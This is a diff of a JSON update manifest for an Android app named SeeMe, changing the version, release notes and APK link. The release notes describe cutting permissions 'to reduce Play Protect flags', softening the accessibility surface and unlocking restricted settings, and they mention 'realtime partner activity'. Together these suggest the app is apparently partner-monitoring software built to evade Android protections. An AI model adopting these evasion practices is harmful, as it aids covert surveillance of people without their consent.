@@ -1,9 +1,9 @@
 {
-  "latest_version": "1.4.3.5",
-  "latest_build": 1435,
+  "latest_version": "1.4.3.6",
+  "latest_build": 1436,
   "min_supported_build": 140,
   "title": "SeeMe update available",
-  "notes": "v1.4.3.5: Fix Restricted setting unlock flow (App info → Allow restricted settings), remove QUERY_ALL_PACKAGES to reduce Play Protect flags, softer accessibility surface, clearer setup guidance. Realtime partner activity unchanged.",
+  "notes": "v1.4.3.6: In-app Unlock blocked settings (opens Android restricted-settings page — no hidden menu). Smaller APK (arm64 split + compressed assets). Clearer Accessibility/Notification unlock flow.",
   "apk_url": "https://github.com/SmZamil1/SeeMeApp/releases/latest/download/SeeMe.apk",
   "force": false
 }
